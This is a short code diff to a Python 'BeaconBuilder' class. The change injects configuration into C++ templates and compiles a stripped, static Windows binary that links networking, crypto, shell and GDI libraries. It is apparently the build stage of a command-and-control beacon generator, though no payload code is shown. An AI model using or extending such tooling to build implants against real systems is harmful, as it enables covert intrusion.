@@ -112,8 +112,16 @@ class BeaconBuilder:
             "result_path": "/api/result",
         }
 
-        # copy + inject
+        # copy + inject ALL templates (both .cpp and .hpp) into build dir
         out_cpp = self.build_dir / "beacon_built.cpp"
+
+        # 1. inject every header referenced by beacon.cpp
+        for hdr in TEMPLATE_DIR.glob("*.hpp"):
+            hdr_src = hdr.read_text(encoding="utf-8")
+            hdr_injected = self._inject(hdr_src, cfg)
+            (self.build_dir / hdr.name).write_text(hdr_injected, encoding="utf-8")
+
+        # 2. inject the .cpp
         template_src = tpl.read_text(encoding="utf-8")
         injected = self._inject(template_src, cfg)
 
@@ -130,9 +138,11 @@ class BeaconBuilder:
 
         cmd = [
             cc, "-O2", "-s", "-static", "-std=c++20",
+            "-I", str(self.build_dir),
             "-I", str(TEMPLATE_DIR),
             "-o", str(out_exe), str(out_cpp),
             "-lws2_32", "-lwinhttp", "-lbcrypt", "-ladvapi32",
+            "-liphlpapi", "-lgdi32", "-lole32", "-lshell32", "-luser32",
         ]
         print_info(f"compiling {out_name}")
         print_kv("cc", cc)
